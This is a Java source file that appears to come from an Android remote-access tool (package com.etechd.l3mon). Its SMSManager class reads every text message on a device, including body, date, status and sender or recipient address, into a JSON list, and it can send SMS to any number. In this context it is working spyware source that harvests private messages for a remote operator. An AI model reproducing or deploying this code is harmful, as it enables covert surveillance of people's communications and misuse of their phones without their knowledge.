package com.etechd.l3mon;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    public static JSONObject getsms()  {
        JSONObject result = null;
        JSONArray jarray = null;

        try {

            jarray = new JSONArray();

            result = new JSONObject();
            Uri uri = Uri.parse("content://sms/");
            Context act = MainService.getContextOfApplication();
            Cursor c= act.getContentResolver().query(uri, null, null ,null,null);

            // Read the sms data and store it in the list
            if(c.moveToFirst()) {

                for(int i=0; i < c.getCount(); i++) {

                    result.put("body",c.getString(c.getColumnIndexOrThrow("body")).toString());

                    result.put("date",c.getString(c.getColumnIndexOrThrow("date")).toString());
                    result.put("read",c.getString(c.getColumnIndexOrThrow("read")).toString());
                    result.put("type",c.getString(c.getColumnIndexOrThrow("type")).toString());
                    if((c.getString(c.getColumnIndexOrThrow("type")).toString()).equals("3")) {
                        String threadid = c.getString(c.getColumnIndexOrThrow("thread_id")).toString();
                        Cursor cur= act.getContentResolver().query(Uri.parse("content://mms-sms/conversations?simple=true"), null, "_id ="+threadid ,null,null);
                        if(cur.moveToFirst()) {
                            String  recipientId = cur.getString(cur.getColumnIndexOrThrow("recipient_ids")).toString();
                            cur=  act.getContentResolver().query(Uri.parse("content://mms-sms/canonical-addresses"), null, "_id = " + recipientId, null, null);
                            if(cur.moveToFirst()) {
                                String address = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
                                result.put("address",address);
                                cur.close();
                            }
                        }

                    }else {
                        result.put("address",c.getString(c.getColumnIndexOrThrow("address")).toString());
                    }
                    jarray.put(result);
                    result = new JSONObject();

                    c.moveToNext();
                }
            }
            c.close();

            result.put("smslist", jarray);

        } catch (IllegalArgumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return result;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
